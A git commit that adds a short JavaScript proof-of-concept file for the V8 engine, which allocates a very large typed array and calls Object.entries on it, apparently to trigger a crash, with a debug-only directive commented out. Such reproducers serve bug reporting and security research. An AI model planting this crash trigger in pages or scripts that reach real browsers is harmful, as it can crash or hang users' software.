4e1d5194e84f7b654c0df993c7a54827ffd3a01b
meelunae <git@eleuna.me>
2025-05-22 00:57:04 +0200

    Add PoC JS

---
+++ v8_poc.js
@@ -0,0 +1,9 @@
+function main() {
+const v6 = new Uint8ClampedArray(364942829);
+let v7 = undefined;
+const v10 = Object.entries(v6,-3663704934);
+}
+// This is a directive that only works on debug v8 and requires a specific flag to run
+// if the flag is not specified, the JS is deemed invalid
+//%NeverOptimizeFunction(main);
+main();
